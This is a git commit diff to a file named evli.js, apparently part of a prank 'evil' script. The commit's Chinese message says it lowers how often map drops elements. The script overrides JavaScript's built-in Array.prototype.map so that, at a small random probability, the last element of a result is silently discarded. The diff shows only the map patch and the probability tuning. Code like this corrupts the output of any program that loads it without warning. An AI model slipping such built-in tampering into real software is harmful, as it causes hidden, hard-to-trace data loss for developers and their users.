939852c3d41c4cc5164d2985d9661694cd7bb336
Cat73 <root@cat73.org>
2022-08-19 18:28:20 +0800

    :wrench: 调低 map 丢失元素的触发概率

--- evli.js
+++ evli.js
@@ -8,6 +8,7 @@
   const luckNum3 = Math.random()
   const luckNum4 = Math.random()
   const luckNum5 = Math.random()
+  const minLuckNum = Math.min(luckNum1, luckNum2, luckNum3, luckNum4, luckNum5)
 
   if (luckNum1 + luckNum2 > luckNum3 + luckNum4 + luckNum5) return // 小概率什么都不发生
 
@@ -40,16 +41,16 @@
     }
   }
 
-  // Array.map 有 luckNum5 的概率丢失最后一个元素
+  // Array.map 有 minLuckNum / 10 的概率丢失最后一个元素
   const _Array_map = Array.prototype.map;
   Array.prototype.map = function (...args) {
     result = _Array_map.call(this, ...args);
-    if (_Math_Random() < luckNum5) {
+    if (_Math_Random() < minLuckNum / 10) {
       result.length = Math.max(result.length - 1, 0);
     }
     return result;
   }
 
   // 调试输出
-  console.log(`luckNum1=${luckNum1}, luckNum2=${luckNum2}, luckNum3=${luckNum3}, luckNum4=${luckNum4}, luckNum5=${luckNum5}, randomRate=${randomRate}, includesMagicNum=${includesMagicNum}`)
+  console.log(`luckNum1=${luckNum1}, luckNum2=${luckNum2}, luckNum3=${luckNum3}, luckNum4=${luckNum4}, luckNum5=${luckNum5}, minLuckNum=${minLuckNum}, randomRate=${randomRate}, includesMagicNum=${includesMagicNum}`)
 })(+new Date('2022-01-01T00:00:00.000')) // 也可以用时间戳（纯数字）
